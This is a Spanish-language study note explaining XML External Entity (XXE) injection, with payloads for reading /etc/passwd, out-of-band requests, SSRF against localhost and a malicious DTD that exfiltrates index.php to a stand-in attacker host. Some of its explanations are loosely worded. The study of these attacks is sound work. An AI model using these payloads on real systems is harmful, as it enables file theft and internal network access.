___

- Tags:

___
# Introducción

La Inyección de Entidades XML Externas (**XXE**) es una vulnerabilidad que se produce cuando una aplicación no valida correctamente las entradas [[XML]] del usuario, permitiendo la inclusión de [[Entidades|entidades externas]] no deseadas. En esta nota, exploraremos distintos aspectos de la **inyección XXE**, incluyendo la XXE básica, la XXE OOB (Out-of-Band), y el uso de un DTD malicioso.

___
# Inyección XXE Básica

La **inyección XXE** básica implica la manipulación de un documento [[XML]] para incluir entidades externas. Por ejemplo:

```xml
<!DOCTYPE nota [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<informacion>
  &xxe;
</informacion>
```

En este caso, la entidad `xxe` hace referencia al contenido del archivo externo `passwd`.

___
# Inyección XXE OOB (Out-of-Band)

La inyección **XXE OOB** es una variante en la que la aplicación atacada realiza solicitudes [[HTTP]] para enviar los resultados de la inyección a un servidor controlado por el atacante.

```xml
<!DOCTYPE nota [
  <!ENTITY % xxe SYSTEM "http://servidor_malicioso.com/xxe">
  %xxe;
]>

<informacion>
  Datos sensibles
</informacion>
```

En este ejemplo, `%xxe;` realiza una solicitud [[HTTP]] al servidor malicioso con los datos sensibles de la aplicación. Es importante destacar que esta técnica puede utilizarse para realizar Server-Side Request Forgery ([[SSRF]]), donde la aplicación atacada realiza solicitudes a recursos internos, como puertos, mediante URLs locales. Un ejemplo específico podría ser acceder a un puerto solo disponible por localhost:

```xml
<!DOCTYPE nota [
  <!ENTITY % xxe SYSTEM "http://localhost:8080/internal/resource">
  %xxe;
]>

<informacion>
  Datos sensibles
</informacion>
```

___
# DTD Malicioso 

Un **DTD malicioso** puede aprovecharse para ejecutar código malicioso en el servidor. Por ejemplo:

```xml
<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://servidor_malicioso.com/?data=%payload;'>">
%eval;
%exfil;
```

Este ejemplo utiliza el **DTD malicioso** para codificar en base64 el contenido del archivo `index.php` y enviarlo al servidor malicioso.

____
# Conclusiones

La **inyección XXE** es una vulnerabilidad seria que puede tener consecuencias significativas en la seguridad de una aplicación. Al comprender las variantes, como la inyección **XXE OOB** y el uso de **DTD maliciosos**, los desarrolladores pueden implementar medidas de seguridad adecuadas para prevenir este tipo de ataques.